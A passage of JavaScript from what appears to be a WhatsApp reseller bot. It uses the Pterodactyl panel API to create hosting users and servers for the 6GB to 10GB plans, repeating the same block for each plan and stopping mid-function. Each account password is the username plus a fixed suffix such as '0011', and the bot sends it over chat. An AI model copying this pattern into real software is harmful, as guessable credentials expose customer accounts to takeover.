reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7168"
let cpu = "170"
let disk = "7168"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isSeler && !groupseller && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location
let memo = "8192"
let cpu = "200"
let disk = "8192"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location
let memo = "9216"
let cpu = "220"
let disk = "9216"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "dikatoki@cpanel.bot"
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`

